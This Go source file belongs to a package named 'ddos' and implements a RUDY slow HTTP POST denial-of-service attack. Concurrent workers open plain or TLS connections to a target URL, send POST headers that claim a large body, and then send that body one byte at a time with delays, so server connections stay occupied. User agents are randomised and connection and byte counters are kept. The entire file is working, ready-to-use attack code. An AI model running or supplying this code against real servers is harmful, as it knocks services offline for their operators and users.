package ddos

import (
	"crypto/tls"
	"fmt"
	"net"
	"sync/atomic"
	"time"
)

// startRUDYAttack starts RUDY (R-U-Dead-Yet) slow HTTP POST attack
func (d *DDoSAttack) startRUDYAttack() {
	d.startRUDYWorkers(d.config.MaxThreads)
}

// startRUDYWorkers starts RUDY attack workers
func (d *DDoSAttack) startRUDYWorkers(numWorkers int) {
	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.rudyWorker()
	}
}

// rudyWorker performs slow HTTP POST attack
func (d *DDoSAttack) rudyWorker() {
	defer d.wg.Done()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			d.rudyConnection()
		}
	}
}

// rudyConnection creates a slow HTTP POST connection
func (d *DDoSAttack) rudyConnection() {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	// Determine if we should use TLS
	useTLS, _, targetURL := d.shouldUseTLS(d.config.TargetURL)
	host, port, path := d.parseTargetURL(targetURL, useTLS)

	// Connect
	var conn net.Conn
	var err error

	dialer := &net.Dialer{
		Timeout: d.config.Timeout,
	}

	if useTLS {
		tlsConfig := d.createTLSConfig()
		conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
	} else {
		conn, err = dialer.Dial("tcp", host+":"+port)
	}

	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}
	defer conn.Close()

	atomic.AddInt64(&d.requestsSent, 1)

	// Send POST request headers
	postHeaders := fmt.Sprintf("POST %s HTTP/1.1\r\n", path)
	postHeaders += fmt.Sprintf("Host: %s\r\n", host)
	postHeaders += fmt.Sprintf("User-Agent: %s\r\n", d.getRandomUserAgent())
	postHeaders += "Accept: */*\r\n"
	postHeaders += "Content-Type: application/x-www-form-urlencoded\r\n"
	postHeaders += fmt.Sprintf("Content-Length: %d\r\n", d.config.RUDYBodySize)
	postHeaders += "Connection: keep-alive\r\n"
	postHeaders += "\r\n"

	_, err = conn.Write([]byte(postHeaders))
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}
	atomic.AddInt64(&d.bytesSent, int64(len(postHeaders)))

	// Send body very slowly (1 byte every RUDYDelay)
	bodyData := make([]byte, d.config.RUDYBodySize)
	for i := 0; i < d.config.RUDYBodySize; i++ {
		select {
		case <-d.ctx.Done():
			return
		default:
			// Send one byte
			_, err := conn.Write(bodyData[i : i+1])
			if err != nil {
				atomic.AddInt64(&d.requestsFailed, 1)
				return
			}
			atomic.AddInt64(&d.bytesSent, 1)
			atomic.AddInt64(&d.requestsSuccess, 1)

			// Wait before sending next byte
			select {
			case <-d.ctx.Done():
				return
			case <-time.After(d.config.RUDYDelay):
				// Continue
			}
		}
	}
}

